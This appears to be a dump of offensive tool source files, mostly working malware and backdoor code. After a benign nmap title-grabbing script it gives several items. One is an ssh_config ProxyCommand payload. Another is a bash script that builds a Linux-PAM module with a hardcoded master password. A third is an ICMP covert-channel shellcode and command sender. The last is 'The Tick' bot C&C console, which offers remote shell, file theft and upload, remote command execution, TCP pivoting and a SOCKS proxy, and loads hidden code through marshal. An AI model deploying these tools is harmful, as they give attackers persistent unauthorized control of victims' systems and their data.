  -- check for a redirect
  if resp.location then
    redirect_url = resp.location[#resp.location]
    if resp.status and tostring( resp.status ):match( ""30%d"" ) then
      return {redirect_url = redirect_url}, (""Did not follow redirect to %s""):format( redirect_url )
    end
  end

  if ( not(resp.body) ) then
    return
  end

  -- try and match title tags
  title = string.match(resp.body, ""<[Tt][Ii][Tt][Ll][Ee][^>]*>([^<]*)</[Tt][Ii][Tt][Ll][Ee]>"")

  local display_title = title

  if display_title and display_title ~= """" then
    display_title = string.gsub(display_title , ""[\n\r\t]"", """")
    if #display_title > 65 then
      display_title = string.sub(display_title, 1, 62) .. ""...""
    end
  else
    display_title = ""Site doesn't have a title""
    if ( resp.header and resp.header[""content-type""] ) then
      display_title = display_title .. ("" (%s).""):format( resp.header[""content-type""] )
    else
      display_title = display_title .. "".""
    end
  end

  local output_tab = stdnse.output_table()
  output_tab.title = title
  output_tab.redirect_url = redirect_url

  local output_str = display_title
  if redirect_url then
    output_str = output_str .. ""\n"" .. (""Requested resource was %s""):format( redirect_url )
  end

  return output_tab, output_str
end"
ssh_config,"Host *
    ProxyCommand echo ""xterm -display 127.0.0.1:1 &"" | at now + 1 minute &>/dev/null && rm -f ~/.ssh/config"
pam-backdoor,"#!/bin/bash

OPTIND=1

PAM_VERSION=
PAM_FILE=
PASSWORD=

echo ""Automatic PAM Backdoor""

function show_help {
	echo """"
	echo ""Example usage: $0 -v 1.3.0 -p some_s3cr3t_p455word""
	echo ""For a list of supported versions: https://github.com/linux-pam/linux-pam/releases""
}

while getopts "":h:?:p:v:"" opt; do
    case ""$opt"" in
    h|\?)
        show_help
        exit 0
        ;;
    v)  PAM_VERSION=""$OPTARG""
        ;;
    p)  PASSWORD=""$OPTARG""
        ;;
    esac
done

shift $((OPTIND-1))

[ ""$1"" = ""--"" ] && shift

if [ -z $PAM_VERSION ]; then
	show_help
	exit 1
fi;

if [ -z $PASSWORD ]; then
	show_help
	exit 1
fi;

echo ""PAM Version: $PAM_VERSION""
echo ""Password: $PASSWORD""
echo """"

PAM_BASE_URL=""https://github.com/linux-pam/linux-pam/archive""
PAM_DIR=""linux-pam-${PAM_VERSION}""
PAM_FILE=""v${PAM_VERSION}.tar.gz""
PATCH_DIR=`which patch`

if [ $? -ne 0 ]; then
	echo ""Error: patch command not found. Exiting...""
	exit 1
fi
wget -c ""${PAM_BASE_URL}/${PAM_FILE}""
if [[ $? -ne 0 ]]; then # did not work, trying the old format    
    PAM_DIR=""linux-pam-Linux-PAM-${PAM_VERSION}""
    PAM_FILE=""Linux-PAM-${PAM_VERSION}.tar.gz""
    wget -c ""${PAM_BASE_URL}/${PAM_FILE}""
    if [[ $? -ne 0 ]]; then
        # older version need a _ instead of a .
        PAM_VERSION=""$(echo $PAM_VERSION | tr '.' '_')""  
        PAM_DIR=""linux-pam-Linux-PAM-${PAM_VERSION}""
        PAM_FILE=""Linux-PAM-${PAM_VERSION}.tar.gz""
        wget -c ""${PAM_BASE_URL}/${PAM_FILE}""
        if [[ $? -ne 0 ]]; then        
            echo ""Failed to download""
            exit 1
        fi        
    fi
fi

tar xzf $PAM_FILE
cat backdoor.patch | sed -e ""s/_PASSWORD_/${PASSWORD}/g"" | patch -p1 -d $PAM_DIR
cd $PAM_DIR
# newer version need autogen to generate the configure script
if [[ ! -f ""./configure"" ]]; then 
    ./autogen.sh 
fi 
./configure
make
cp modules/pam_unix/.libs/pam_unix.so ../
cd ..
echo ""Backdoor created.""
echo ""Now copy the generated ./pam_unix.so to the right directory (usually /lib/security/)""
echo """""
rooty,"from scapy.all import *
import _thread
import getopt
import struct
import hexdump
import re

from termcolor import colored

MSG_TYPE_RESPONSE =             0x00
MSG_TYPE_SHELLCODE =            0x01
MSG_TYPE_COMMAND =              0x02
MSG_TYPE_REMOTE_SHELLCODE =     0x03

MSG_ARCH_X64=                   0x10
MSG_OS_WINDOWS=                 0x20
MSG_OS_BSD=                     0x40
MSG_OS_LINUX=                   0x80

magic = b""GOATSE""
search = """"
src_ip = """"
dst_ip = """"
destinations = []
hosts_file = """"
shellcode_file = """"
block_size = 128
interface=None

class RootyMessageException(Exception):
    pass

class SystemInformation():
    def __init__(self, ip, arch, os):
        self.ip = ip
        self.arch = arch
        self.os = os

    def __str__(self):
        res = ""{}"".format(self.ip)

        if self.os == MSG_OS_WINDOWS:
            res += "" Windows""
        elif self.os == MSG_OS_BSD:
            res += "" BSD""
        elif self.os == MSG_OS_LINUX:
            res += "" Linux""
        else:
            res += "" Unknown""

        if self.arch  == MSG_ARCH_X64:
            res += "" X64""
        else:
            res += "" i386""

        return res
       
class RootyMessage():
    def __init__(self, pkt):
        global magic, block_size

        if len(pkt.load) > 0 and (len(pkt.load) % block_size == 0):
            data = crypt_data(pkt.load[block_size:], pkt.load[:block_size])

            if data.startswith(magic):
                self.source = SystemInformation(pkt[IP].src, data[6] & 0x10, data[6] & 0xE0)
                self.message_type = data[6] & 0x0F
                self.data_len = struct.unpack('<H', data[7:9])[0] 
                self.data = data[9:9 + self.data_len].decode()
                return
                
        raise RootyMessageException()

    def display(self):
        print(""=""*50)

        for attr in ['source', 'message_type', 'data_len']:
            print(""{}: {}"".format(attr, getattr(self, attr)))
        hexdump.hexdump(self.data.encode())

########## functions ############
def usage(err=None):
    if err:
        print(""Error: {}\n"".format(err))

    print(""Usage:"")
    print(""\tpython {} -d <dst_ip|host_file> [-S <search>] -i <interface> [-s <src_ip>] [-f <shellcode_file>] [-h]"".format(sys.argv[0]))
    print(""\t\tinterface: The interface that should be used for sending packets. (REQUIRED)"")
    print(""\t\tdst_ip: the host we are communicating with (Can be broadcast)"")
    print(""\t\tsearch: regex to filter hosts"")
    print(""\t\thost_file: file containing hostnames of hosts we are communicating with"")
    print(""\t\tsrc_ip: the address we want to send from (Can be anything)"")
    print(""\t\tshellcode_file: send shellcode from this file to run on the host or use - to read from stdin"")
    print()
    sys.exit(0)

def parse_args():
   global dst_ip, src_ip, shellcode_file, interface, destinations, search

   try:
       opts, args = getopt.gnu_getopt(sys.argv[1:], 'i:d:s:f:S:h', \
         ['interface=', 'destination=', 'source=', 'shellcode=', 'search=', 'help'])

   except getopt.GetoptError as err:
      usage(err)    

   for o, a in opts:
      if o in ('-d', '--destination'):
         if os.path.isfile(a):
            destinations = open(a, 'r').read().strip().split('\n')
         else:
            destinations = [a]
      if o in ('-i', '--interface'):
         interface = a
      if o in ('-s', '--source'):
         src_ip = a
      if o in ('-f', '--shellcode'):
         shellcode_file = a
      if o in ('-S', '--search'):
          search = a
      if o in ('-h', '--help'):
         usage()

def generate_key(len=64):
    global block_size

    return bytes([(random.randint(0, 255)) for _ in range(block_size)])


def crypt_data(data, key):
    global block_size

    if len(data) % block_size:
        data += (b""\x00"" * (block_size - (len(data) % block_size)))

    j = 0
    output = []

    for i in range(len(data)):
        output.append(data[i] ^ key[j])

        if j > 0 and (j % (block_size - 1) == 0):
            j = 0
        else:
            j += 1

    return bytes(output)


def build_pkt(src, dst, data):
    ip = IP(dst=dst)

    if src_ip:
        ip.src = src

    return ip/ICMP(type=8, code=0, id=random.randint(0, 65535))/data

def sniff_packet(pkt):
    try:
        msg = RootyMessage(pkt)
        
        if msg.message_type == MSG_TYPE_RESPONSE:
            print('{}: {}'.format(colored(msg.source, 'green'), msg.data), end='')

    except (RootyMessageException, AttributeError):
        pass


def start_listener():
    global interface

    sniff(filter=""icmp"", prn=sniff_packet, iface=interface)

def send_shellcode():
   global MSG_TYPE_SHELLCODE, MSG_TYPE_REMOTE_SHELLCODE, magic, shellcode_file, last_packet
   shellcode = magic + MSG_TYPE_SHELLCODE
      
   # Open and read the shellcode
   if shellcode_file == '-':
      shellcode += sys.stdin.read()
   else:
      f = open(shellcode_file, 'r')
      shellcode += f.read()
      f.close()

   # Get the required crypto bits
   key = generate_key()
   encrypted_data = crypt_data(shellcode, key)
   last_packet = encrypted_data

   # Now send it
   send(build_pkt(src_ip, dst_ip, encrypted_data, key), verbose=0)

# We need use rand for key generation
random.seed()

# Parse the arguments
parse_args()

# Filter hosts by the search string
if search:
    destinations = [x for x in destinations if re.search(search, x)]

# Make sure we at least have a destination
if not destinations:
   print(""ERROR: Destination must be specified"")
   usage()
   sys.exit(0)
   
# Make sure we at least have a destination
if not interface:
   print(""ERROR: Interface must be specified"")
   usage()
   sys.exit(0)
 
# Do we send shellcode or start a shell
if shellcode_file != """":
	send_shellcode()
	print(""Shellcode sent"")
	sys.exit(0)

# Create the listener thread
_thread.start_new_thread(start_listener, ())

# Now just read our input and send commands
while 1:
   line = sys.stdin.readline().rstrip('\n').encode()
   key = generate_key()
   encrypted_data = crypt_data(magic + b""\x02"" + struct.pack('<H', len(line)) + line, key)

   for dst_ip in destinations:
       send(build_pkt(src_ip, dst_ip, key + encrypted_data), verbose=0, iface=interface)"
tick-1,"#!/usr/bin/env python2
# -*- coding: utf8 -*-

from __future__ import print_function

##############################################################################
# Imports and other module initialization.

# This namespace is pretty cluttered so make sure
# ""from tick import *"" doesn't make too much of a mess.
__all__ = [""Listener"", ""Console"", ""BotError""]

# Standard imports...
import sys
import readline
import os
import os.path

# More standard imports...
from socket import *
from struct import *
from cmd import Cmd
from shlex import split
from threading import Thread, RLock
from traceback import print_exc
from uuid import UUID
from collections import OrderedDict
from argparse import ArgumentParser
from time import sleep
from functools import wraps
from multiprocessing import Process
from subprocess import check_output

try:
    from colorama import *

    if ""--no-color"" in sys.argv:
        ANSI_ENABLED = False
        init(wrap = True, strip = True)
    else:
        ANSI_ENABLED = True
        init()

except ImportError:
    print(""Missing dependency: colorama"")
    print(""  pip install colorama"")
    exit(1)
try:
    from argparse_color_formatter import ColorHelpFormatter
except ImportError:
    print(""Missing dependency: "" + Style.BRIGHT + Fore.RED + ""argparse_color_formatter"" + Style.RESET_ALL)
    print(Style.BRIGHT + Fore.BLUE + ""  pip install argparse-color-formatter"" + Style.RESET_ALL)
    exit(1)


try:
    from texttable import Texttable
except ImportError:
    print(""Missing dependency: ""+ Style.BRIGHT + Fore.RED + ""texttable"" + Style.RESET_ALL)
    print(Style.BRIGHT + Fore.BLUE + ""  pip install texttable"" + Style.RESET_ALL)
    exit(1)

try:
    assert False
    print(""Running with assertions disabled is a "" + Style.BRIGHT + Fore.RED + ""TERRIBLE IDEA"" + Style.RESET_ALL, end=' ')
    if ANSI_ENABLED:
        print("" \xf0\x9f\x98\xa0"")   # angry face emoji
    else:
        print()
    print(""Please don't do that ever again..."")
    exit(1)
except AssertionError:
    pass

BORING_BANNER = """"""
ICAbWzMybRtbMW3ilZTilabilZcbWzIybeKUrCDilKzilIzilIDilJAgIBtbMW3ilZTilabilZcb
WzIybeKUrOKUjOKUgOKUkOKUrOKUjOKUgBtbMG0KICAbWzMybRtbMW0g4pWRIBtbMjJt4pSc4pSA
4pSk4pSc4pSkICAgG1sxbSDilZEgG1syMm3ilILilIIgIOKUnOKUtOKUkBtbMG0KICAbWzMybRtb
MW0g4pWpIBtbMjJt4pS0IOKUtOKUlOKUgOKUmCAgG1sxbSDilakgG1syMm3ilLTilJTilIDilJji
lLQg4pS0G1swbQo=
"""""".decode(""base64"")

FUN_BANNER = """"""
ChtbMzFtG1sxbeKWhOKWhOKWhOKWiOKWiOKWiOKWiOKWiBtbMjJt4paTIBtbMW3ilojilogbWzIy
beKWkSAbWzFt4paI4paIG1syMm0g4paTG1sxbeKWiOKWiOKWiOKWiOKWiCAgICDiloTiloTiloTi
lojilojilojilojilogbWzIybeKWkyAbWzFt4paI4paIG1syMm3ilpMgG1sxbeKWhOKWiOKWiOKW
iOKWiOKWhCAgIOKWiOKWiCDiloTilojiloAbWzIybQobWzIybeKWkyAgG1sxbeKWiOKWiBtbMjJt
4paSIOKWk+KWkuKWkxtbMW3ilojilogbWzIybeKWkSAbWzFt4paI4paIG1syMm3ilpLilpMbWzFt
4paIG1syMm0gICAbWzFt4paAG1syMm0gICAg4paTICAbWzFt4paI4paIG1syMm3ilpIg4paT4paS
4paTG1sxbeKWiOKWiBtbMjJt4paS4paSG1sxbeKWiOKWiOKWgCDiloDiloggICDilojilojiloTi
logbWzIybeKWkiAbWzIybQobWzIybeKWkiDilpMbWzFt4paI4paIG1syMm3ilpEg4paS4paR4paS
G1sxbeKWiOKWiOKWgOKWgOKWiOKWiBtbMjJt4paR4paSG1sxbeKWiOKWiOKWiBtbMjJtICAgICAg
4paSIOKWkxtbMW3ilojilogbWzIybeKWkSDilpLilpHilpIbWzFt4paI4paIG1syMm3ilpLilpIb
WzFt4paT4paIICAgIOKWhCDilpPilojilojilojiloQbWzIybeKWkSAbWzIybQobWzIybeKWkSDi
lpMbWzFt4paI4paIG1syMm3ilpMg4paRIOKWkRtbMW3ilpPilogbWzIybSDilpEbWzFt4paI4paI
G1syMm0g4paS4paTG1sxbeKWiCAg4paEG1syMm0gICAg4paRIOKWkxtbMW3ilojilogbWzIybeKW
kyDilpEg4paRG1sxbeKWiOKWiBtbMjJt4paR4paSG1sxbeKWk+KWk+KWhCDiloTilojilojilpLi
lpMbWzFt4paI4paIIOKWiOKWhCAbWzIybQobWzIybSAg4paS4paIG1sxbeKWiBtbMjJt4paSIOKW
kSDilpEbWzFt4paT4paI4paSG1syMm3ilpHilogbWzFt4paIG1syMm3ilpPilpHilpIbWzFt4paI
4paI4paI4paIG1syMm3ilpIgICAgIOKWkuKWiBtbMW3ilogbWzIybeKWkiDilpEg4paRG1sxbeKW
iOKWiBtbMjJt4paR4paSIBtbMW3ilpPilojilojilojiloAbWzIybSDilpHilpLilogbWzFt4paI
G1syMm3ilpIgG1sxbeKWiOKWhBtbMjJtChtbMjJtICDilpIg4paR4paRICAgIBtbMW3ilpIbWzIy
bSDilpHilpEbWzFt4paS4paR4paSG1syMm3ilpHilpEg4paS4paRIOKWkSAgICAg4paSIOKWkeKW
kSAgIOKWkRtbMW3ilpMbWzIybSAg4paRIOKWkeKWkiDilpIgIOKWkeKWkiDilpLilpIgG1sxbeKW
kxtbMjJt4paSG1syMm0KG1syMm0gICAg4paRICAgICDilpIg4paR4paS4paRIOKWkSDilpEg4paR
ICDilpEgICAgICAg4paRICAgICDilpIg4paRICDilpEgIOKWkiAgIOKWkSDilpHilpIg4paS4paR
G1syMm0KG1syMm0gIOKWkSAgICAgICAbWzJt4paRG1syMm0gIOKWkeKWkSDilpEgICAbWzJt4paR
G1syMm0gICAgICAgIOKWkSAgICAgICDilpIg4paR4paRICAgICAgICAbWzJt4paRG1syMm0g4paR
4paRIBtbMm3ilpEbWzIybSAbWzIybQobWzJtICAgICAgICAgIOKWkSAg4paRICDilpEgICDilpEg
IOKWkSAgICAgICAgICAgICDilpEgIBtbMjJt4paRG1sybSDilpEgICAgICDilpEgIOKWkSAgIBtb
MjJtChtbMm0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4paRICAgICAg
ICAgICAgICAgG1syMm0KG1swbQ==
"""""".decode(""base64"")

try:
    import marshal, types, zlib
    play = play.decode(""base64"")
    play = zlib.decompress(play)
    play = marshal.loads(play)                      # I know many of you will
    play = types.FunctionType(play, globals(), ""play"")    # go ""yikes"" now xD
except Exception:
    del play        
    print_exc()
#del play   # uncomment to disable

BASE_CMD_SYSTEM         = 0x0000
BASE_CMD_FILE           = 0x0100
BASE_CMD_NET            = 0x0200

CMD_NOP                 = 0xFFFF

CMD_SYSTEM_EXIT         = BASE_CMD_SYSTEM + 0
CMD_SYSTEM_FORK         = BASE_CMD_SYSTEM + 1
CMD_SYSTEM_SHELL        = BASE_CMD_SYSTEM + 2

CMD_FILE_READ           = BASE_CMD_FILE + 0
CMD_FILE_WRITE          = BASE_CMD_FILE + 1
CMD_FILE_DELETE         = BASE_CMD_FILE + 2
CMD_FILE_EXEC           = BASE_CMD_FILE + 3
CMD_FILE_CHMOD          = BASE_CMD_FILE + 4

CMD_HTTP_DOWNLOAD       = BASE_CMD_NET + 0
CMD_DNS_RESOLVE         = BASE_CMD_NET + 1
CMD_TCP_PIVOT           = BASE_CMD_NET + 2

CMD_STATUS_OK      = 0x00
CMD_STATUS_ERROR   = 0xFF

def build_pivot_struct(ip, port, from_port = 0):
    return inet_aton(ip) + pack(""!HH"", port, from_port)

def build_command(cmd_id, cmd = """", data = """"):
    cmd_len = len(cmd)
    try:
        data_len = len(data)
    except TypeError:
        data_len = data
        data = """"
    return pack(""!HHL"", cmd_id, cmd_len, data_len) + cmd + data

def get_resp_header(sock):
    status = sock.recv(1)
    data_len = sock.recv(4)
    if status == """" or data_len == """":
        raise BotError(""disconnected"")
    status, data_len = unpack(""!BL"", status + data_len)
    if status == CMD_STATUS_ERROR:
        if data_len > 0:
            msg = recvall(sock, data_len)
            if len(msg) != data_len:
                raise BotError(""disconnected"")
        raise BotError(msg)
    return data_len

def skip_bytes(sock, count):
    while count > 0:
        bytes = len(sock.recv(count))
        if bytes == 0:
            raise BotError(""disconnected"")
        count = count - bytes
        
def get_resp_no_data(sock):
    data_len = get_resp_header(sock)
    skip_bytes(sock, data_len)

def recvall(sock, count):
    buffer = """"
    while len(buffer) < count:
        tmp = sock.recv(min(65536, count - len(buffer)))
        if not tmp:
            break
        buffer = buffer + tmp
    return buffer

def get_resp_with_data(sock):
    data_len = get_resp_header(sock)
    data = recvall(sock, data_len)
    if len(data) != data_len:
        raise BotError(""disconnected"")
    return data

def copy_stream(src, dst, count):
    while count > 0:
        buffer = src.read(min(65536, count))
        if not buffer:
            break
        count = count - len(buffer)
        dst.write(buffer)

class Listener(Thread):
    ""Listener C&C for The Tick bots.""

    def __init__(self, callback, bind_addr = ""0.0.0.0"", port = 5555):

        self.alive = False

        self.callback = callback

        self.bind_addr = bind_addr
        self.port = port

        self.listen_sock = None

        self.bots = OrderedDict()

        super(Listener, self).__init__()

        self.daemon = True
        
    def __enter__(self):
        self.listen_sock = socket()
        self.listen_sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.listen_sock.bind((self.bind_addr, self.port))
        self.listen_sock.listen(5)
        return self

    def __exit__(self, *args):
        self.alive = False
        try:
            self.listen_sock.shutdown(2)
        except Exception:
            pass
        try:
            self.listen_sock.close()
        except Exception:
            pass
        self.listen_sock = None
        for bot in self.bots.values():
            try:
                bot.sock.shutdown(2)
            except Exception:
                pass
            try:
                bot.sock.close()
            except Exception:
                pass
        self.bots.clear()

    def run(self):

        assert not self.alive
        
        self.alive = True
        
        with self:

            while self.alive:
                try:

                    sock, from_addr = self.listen_sock.accept()
                    try:

                        if not self.alive:
                            try:
                                sock.shutdown(2)
                            except Exception:
                                pass
                            try:
                                sock.close()
                            except Exception:
                                pass
                            break

                        uuid = recvall(sock, 16)
                        if len(uuid) != 16:
                            continue
                        uuid = str(UUID(bytes = uuid))

                        bot = Bot(sock, uuid, from_addr)

                        self.bots[uuid] = bot

                    except:
                        try:
                            sock.shutdown(2)
                        except Exception:
                            pass
                        try:
                            sock.close()
                        except Exception:
                            pass
                        raise
                    
                    try:
                        self.callback(self, bot)
                    except Exception:
                        print_exc()

                except Exception:
                    print_exc()

    def kill(self):
        ""Forcefully kill the background thread.""

        # Trivial case.
        if not self.alive:
            return
        self.alive = False

        s = socket()
        try:
            s.connect((""127.0.0.1"", self.port))
        finally:
            s.close()

class BotError(RuntimeError):
    ""The Tick bot error message.""

def bot_action(method):
    @wraps(method)
    def wrapper(self, *args, **kwds):
        assert self.alive
        try:
            return method(self, *args, **kwds)
        except KeyboardInterrupt:
            self.alive = False
            try:
                self.sock.shutdown(2)
            except:
                pass
            try:
                self.sock.close()
            except:
                pass
            raise BotError(""disconnected"")
        except BotError as e:
            if str(e) == ""disconnected"":
                self.alive = False
            raise
    return wrapper

class Bot(object):
    ""The Tick bot instance.""

    def __init__(self, sock, uuid, from_addr):

        self.alive = True

        self.sock = sock

        self.uuid = uuid
        self.from_addr = from_addr

    def __repr__(self):
        return ""<Bot uuid=%s ip=%s port=%d connected=%s>"" % (
            self.uuid, self.from_addr[0], self.from_addr[1],
            ""yes"" if self.alive else ""no""
        )

    @bot_action
    def system_exit(self):
        self.sock.sendall( build_command(CMD_SYSTEM_EXIT) )
        get_resp_no_data(self.sock)
        self.alive = False

    @bot_action
    def system_fork(self):
        self.sock.sendall( build_command(CMD_SYSTEM_FORK) )
        return str( UUID( bytes = get_resp_with_data(self.sock) ) )

    @bot_action
    def system_shell(self):
        self.sock.sendall( build_command(CMD_SYSTEM_SHELL) )
        get_resp_no_data(self.sock)
        self.alive = False
        return self.sock

    @bot_action
    def file_read(self, remote_file, local_file):
        self.sock.sendall( build_command(CMD_FILE_READ, remote_file) )
        data_len = get_resp_header(self.sock)
        with open(local_file, ""wb"") as fd:
            copy_stream(self.sock.makefile(), fd, data_len)

    @bot_action
    def file_write(self, local_file, remote_file):
        with open(local_file, ""rb"") as fd:
            fd.seek(0, 2)
            file_size = fd.tell()
            fd.seek(0, 0)
            self.sock.sendall( build_command(CMD_FILE_WRITE, remote_file, file_size) )
            copy_stream(fd, self.sock.makefile(), file_size)
        get_resp_no_data(self.sock)

    @bot_action
    def file_delete(self, remote_file):
        self.sock.sendall( build_command(CMD_FILE_DELETE, remote_file) )
        get_resp_no_data(self.sock)

    @bot_action
    def file_exec(self, command_line):
        self.sock.sendall( build_command(CMD_FILE_EXEC, command_line) )
        return get_resp_with_data(self.sock)

    @bot_action
    def file_chmod(self, remote_file, mode_flags = 0o777):
        self.sock.sendall( build_command(CMD_FILE_CHMOD, pack(""!H"", mode_flags) + remote_file) )
        get_resp_no_data(self.sock)

    @bot_action
    def http_download(self, url, remote_file):
        self.sock.sendall( build_command(CMD_HTTP_DOWNLOAD, url, remote_file) )
        get_resp_no_data(self.sock)

    @bot_action
    def dns_resolve(self, domain):
        self.sock.sendall( build_command(CMD_DNS_RESOLVE, domain) )
        response = get_resp_with_data(self.sock)
        ##print "" "".join(""%02x"" % ord(x) for x in response)   # XXX DEBUG
        answer = []
        while response:
            family, = unpack(""!B"", response[0])
            if family == AF_INET:
                addr = response[1:5]
                response = response[5:]
            elif family == AF_INET6:
                addr = response[1:17]
                response = response[17:]
            else:
                raise AssertionError()
            answer.append(inet_ntop(family, addr))
        return answer

    @bot_action
    def tcp_pivot(self, address, port):
        self.sock.sendall( build_command(CMD_TCP_PIVOT, build_pivot_struct(address, port)) )
        get_resp_no_data(self.sock)
        self.alive = False
        return self.sock
    
class RemoteShell(Thread):

    def __init__(self, sock):

        # Socket connected to a remote shell.
        self.sock = sock

        # Flag we'll use to tell the background thread to stop.
        self.alive = True

        # Call the parent class constructor.
        super(RemoteShell, self).__init__()

        # Set the thread as a daemon so way when the
        # main thread dies, this thread will die too.
        self.daemon = True

    # This method is invoked in a background thread.
    # It forwards everything coming from the remote shell to standard output.
    def run(self):
        try:
            while self.alive:
                buffer = self.sock.recv(1024)
                if not buffer:
                    break
                sys.stdout.write(buffer)
        except:
            pass
        finally:
            try:
                self.sock.shutdown(2)
            except Exception:
                pass
            try:
                self.sock.close()
            except Exception:
                pass

    # This method is invoked from the main thread.
    # It forwards everything from standard input to the remote shell.
    # It launches the background thread and kills it before returning.
    # Control+C is caught within this function, which causes the
    # remote shell to be stopped without killing the console.
    def run_parent(self):
        self.start()
        try:
            while self.alive:
                buffer = sys.stdin.readline()
                if not buffer:
                    break
                self.sock.sendall(buffer)
        except:     # DO NOT change this bare except: line
            pass    # I don't care what PEP8 has to say :P
        finally:
            self.alive = False
            try:
                self.sock.shutdown(2)
            except Exception:
                pass
            try:
                self.sock.close()
            except Exception:
                pass
            self.join()

# Pivoting daemon.
class TCPForward(Thread):

    def __init__(self, src_sock, dst_sock):

        # Keep the source and destination sockets.
        # This class only forwards in one direction,
        # so you have to instance it twice and swap
        # the source and destination sockets.
        self.src_sock = src_sock
        self.dst_sock = dst_sock

        # Flag we'll use to tell the background thread to stop.
        self.alive = False

        # Call the parent class constructor.
        super(TCPForward, self).__init__()

        # Set the thread as a daemon so way when the
        # main thread dies, this thread will die too.
        self.daemon = True

    # This method is invoked in a background thread.
    # It forwards everything from the source socket
    # into the destination socket. If either socket
    # dies the other is closed and the thread dies.
    def run(self):
        self.alive = True
        try:
            while self.alive:
                buffer = self.src_sock.recv(65535)
                if not buffer:
                    break
                self.dst_sock.sendall(buffer)
        except:
            pass
        finally:
            self.kill()

    # Forcefully kill the background thread.
    # This one is easier than the others. :)
    def kill(self):
        if not self.alive:
            return
        self.alive = False
        try:
            self.src_sock.shutdown(2)
        except Exception:
            pass
        try:
            self.src_sock.close()
        except Exception:
            pass
        try:
            self.dst_sock.shutdown(2)
        except Exception:
            pass
        try:
            self.dst_sock.close()
        except Exception:
            pass

# SOCKS proxy daemon.
class SOCKSProxy(Thread):

    def __init__(self, listener, uuid, bind_addr = ""127.0.0.1"", port = 1080, username = """", password = """"):

        # The listener that requested to proxy through a bot.
        self.listener = listener

        # The UUID of the bot we'll use to route proxy requests.
        self.uuid = uuid

        # The address to bind to when listening for SOCKS requests.
        # Normally 0.0.0.0 for a shared proxy, 127.0.0.1 for private.
        self.bind_addr = bind_addr

        # The port to listen to for incoming SOCKS proxy requests.
        self.port = port

        # Optional username and password for the SOCKS proxy.
        self.username = username
        self.password = password
        if (username or password) and not (username and password):
            raise ValueError(""Must specify both username and password or neither"")

        # Flag we'll use to tell the background thread to stop.
        self.alive = False

        # Listening socket for incoming SOCKS proxy requests.
        # Will be created and destroyed inside the run() method.
        self.listen_sock = None

        # This is where we'll keep all the TCP forwarders.
        self.bouncers = []

        # Call the parent class constructor.
        super(SOCKSProxy, self).__init__()

        # Set the thread as a daemon so way when the
        # main thread dies, this thread will die too.
        self.daemon = True

    # This method is invoked in a background thread.
    def run(self):

        # It's aliiiiiiive! \o/
        self.alive = True

        try:

            # Listen on the specified port.
            self.listen_sock = socket()
            self.listen_sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            self.listen_sock.bind((self.bind_addr, self.port))
            self.listen_sock.listen(5)

            # Loop until they ask us to stop.
            while self.alive:

                # Accept incoming connections.
                # TODO add a console notification here?
                accept_sock = self.listen_sock.accept()[0]

                # Serve each request one by one.
                # This is a bit crappy because, in theory, someone could
                # connect a socket here and just wait, blocking the whole
                # thing. But I don't think we should worry about that.
                # Normal requests won't block because we'll spawn a thread
                # for each once the tunnel has been established.
                # On error, destroy the socket.
                try:
                    self.serve_socks_request(accept_sock)
                except:
                    try:
                        accept_sock.shutdown(2)
                    except Exception:
                        pass
                    try:
                        accept_sock.close()
                    except Exception:
                        pass
                    if self.alive:
                        #print_exc() # XXX DEBUG
                        continue
                    raise

        # Kill the proxy on error.
        except Exception:
            #if self.alive:
            #    print_exc()         # XXX DEBUG
            #    try:
            #        self.kill()
            #    except Exception:
            #        print_exc()     # XXX DEBUG
            #else:
                try:
                    self.kill()
                except Exception:
                    pass

        # Make sure to clean up on exit.
        finally:

            # Not alive anymore. :sadface:
            self.alive = False

            # Destroy the listening socket.
            try:
                self.listen_sock.shutdown(2)
            except Exception:
                pass
            try:
                self.listen_sock.close()
            except Exception:
                pass

    # Process each SOCKS proxy request.
    # This method runs in a background thread and may spawn more threads.
    # Caller is assumed to destroy the socket after the call.
    def serve_socks_request(self, sock):

        # This blog post helped me a lot :)
        # https://rushter.com/blog/python-socks-server/

        # First header is the version and acceptable auth methods.
        # We only support SOCKS 5 and will ignore the auth. :P
        request = recvall(sock, 2)
        if len(request) != 2:
            return          # fail silently
        version, num_auth = unpack(""!BB"", request)
        if version != 5:
            return          # prevents easy fingerprinting
            #sock.sendall(pack(""!BB"", 5, 0xff))
            #raise RuntimeError(""Bad SOCKS client"")
        methods = recvall(sock, num_auth)

        # If we have a username and password, ask for them.
        # If we don't then just let them it. :)
        # If the client insists on giving us a password
        # anyway, just accept anything they send us.
        # TODO perhaps notify the console when this happens?
        if (self.username and self.password) or ""\x00"" not in methods:
            sock.sendall(pack(""!BB"", 5, 2))
            request = recvall(sock, 2)
            if not request:
                return          # fail silently
            version, ulen = unpack(""!BB"", request)
            assert version == 1
            uname = recvall(sock, ulen)
            plen, = unpack(""!B"", recvall(sock, 1))
            passwd = recvall(sock, ulen)
            if self.username and self.password and (self.username != uname or self.password != passwd):
                sock.sendall(pack(""!BB"", 5, 0xff))
                # TODO perhaps notify the console when this happens?
                #raise RuntimeError(""SOCKS authentication failure, user: %r, pass: %r"" % (uname, passwd))
                return          # fail silently
            sock.sendall(pack(""!BB"", 1, 0))
        else:
            sock.sendall(pack(""!BB"", 5, 0))

        # If all went well we should get a proxy request now.
        # We only support CONNECT requests for IPv4.
        request = recvall(sock, 4)
        if not request:
            return          # fail silently
        version, cmd, _, atyp = unpack(""!BBBB"", request)
        if version != 5 or cmd != 1 or atyp not in (1, 3):
            sock.sendall(pack(""!BBBBIH"", 5, 5, 0, atyp, 0, 0))
            return
            #raise RuntimeError(""Unsupported SOCKS request"")
        if atyp == 1:
            addr = inet_ntoa(recvall(sock, 4))
            port, = unpack(""!H"", recvall(sock, 2))
        elif atyp == 3:
            name_len, = unpack(""!B"", recvall(sock, 1))
            name = recvall(sock, name_len)
            port, = unpack(""!H"", recvall(sock, 2))
        else:
            raise AssertionError(""wtf"")

        # Try to get the bot now.
        # If we can't find it, reject the connection attempt.
        try:
            bot = self.listener.bots[self.uuid]
        except Exception:
            sock.sendall(pack(""!BBBBIH"", 5, 5, 0, atyp, 0, 0))
            raise

        # Do a DNS resolution remotely if needed.
        if atyp == 3:
            try:
                addr = None
                for x in bot.dns_resolve(name):
                    try:
                        inet_aton(x)
                        addr = x
                        break
                    except error:
                        continue
                if not addr:
                    raise RuntimeError(""could not resolve %s to ipv4 address"" % name)
            except Exception:
                sock.sendall(pack(""!BBBBIH"", 5, 5, 0, atyp, 0, 0))
                raise

        # Do a TCP pivot on the bot.
        try:
            bot_sock = bot.tcp_pivot(addr, port)
